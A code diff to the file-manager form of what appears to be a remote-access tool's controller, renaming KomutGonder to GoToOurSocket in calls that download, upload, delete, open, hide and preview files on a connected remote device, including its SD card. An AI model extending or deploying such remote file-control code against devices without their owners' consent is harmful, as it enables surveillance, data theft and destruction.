@@ -27,7 +27,7 @@ namespace Server.Views
                 {
                     Text = "File Manager - ";
                     timer1.Enabled = true;
-                    MainWindow.KomutGonder("INDIR", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("INDIR", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                 }
                 catch (Exception) { }
             }
@@ -192,7 +192,7 @@ namespace Server.Views
                     {
                         try
                         {
-                            MainWindow.KomutGonder("DOSYABYTE", "[VERI]"
+                            MainWindow.GoToOurSocket("DOSYABYTE", "[VERI]"
                                 + Convert.ToBase64String(File.ReadAllBytes(op.FileName)) + "[VERI]" + op.FileName.Substring(
                                 op.FileName.LastIndexOf(@"\") + 1) + "[VERI]" + textBox.Text + "[VERI][0x09]", soketimiz);
                         }
@@ -212,7 +212,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("FOLDERFILE", "[VERI]" + textBox1.Text + "[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("FOLDERFILE", "[VERI]" + textBox1.Text + "[VERI][0x09]", soketimiz);
                 }
                 catch (Exception) { }
             }
@@ -224,7 +224,7 @@ namespace Server.Views
                 listView2.BackgroundImage = null;
                 try
                 {
-                    MainWindow.KomutGonder("FILESDCARD", "[VERI]" + textBox2.Text + "[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("FILESDCARD", "[VERI]" + textBox2.Text + "[VERI][0x09]", soketimiz);
                 }
                 catch (Exception) { }
             }
@@ -241,7 +241,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("DELETE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
+                    MainWindow.GoToOurSocket("DELETE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
              listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                     listView1.SelectedItems[0].Remove();
                 }
@@ -255,7 +255,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("DOSYAAC", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
+                    MainWindow.GoToOurSocket("DOSYAAC", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
                      listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                 }
                 catch (Exception) { }
@@ -268,7 +268,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("DOSYAAC", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("DOSYAAC", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                 }
                 catch (Exception) { }
             }
@@ -285,7 +285,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("DELETE", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("DELETE", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                 }
                 catch (Exception) { }
             }
@@ -297,7 +297,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("GIZLI", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("GIZLI", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                 }
                 catch (Exception) { }
             }
@@ -310,7 +310,7 @@ namespace Server.Views
                 try
                 {
                     Text = "File Manager - "; timer1.Enabled = true;
-                    MainWindow.KomutGonder("INDIR", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("INDIR", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                 }
                 catch (Exception) { }
             }
@@ -340,7 +340,7 @@ namespace Server.Views
                         textBox1.Text = listView1.SelectedItems[0].SubItems[1].Text;
                         try
                         {
-                            MainWindow.KomutGonder("FOLDERFILE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
+                            MainWindow.GoToOurSocket("FOLDERFILE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                         }
                         catch (Exception) { }
                     }
@@ -370,7 +370,7 @@ namespace Server.Views
                         textBox2.Text = listView2.SelectedItems[0].SubItems[1].Text;
                         try
                         {
-                            MainWindow.KomutGonder("FILESDCARD", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
+                            MainWindow.GoToOurSocket("FILESDCARD", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                         }
                         catch (Exception) { }
                     }
@@ -388,7 +388,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("GIZLI", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
+                    MainWindow.GoToOurSocket("GIZLI", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
              listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                 }
                 catch (Exception) { }
@@ -401,7 +401,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("GIZKAPA", "[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("GIZKAPA", "[VERI][0x09]", soketimiz);
                 }
                 catch (Exception) { }
             }
@@ -424,7 +424,7 @@ namespace Server.Views
             {
                 if (listView1.SelectedItems[0].ImageIndex == 4)
                 {
-                    MainWindow.KomutGonder("PRE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
+                    MainWindow.GoToOurSocket("PRE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
              listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                 }
                 else { pictureBox1.Visible = false; }
@@ -437,7 +437,7 @@ namespace Server.Views
             {
                 if (listView2.SelectedItems[0].ImageIndex == 4)
                 {
-                    MainWindow.KomutGonder("PRE", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "/" +
+                    MainWindow.GoToOurSocket("PRE", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "/" +
              listView2.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                 }
                 else { pictureBox1.Visible = false; }
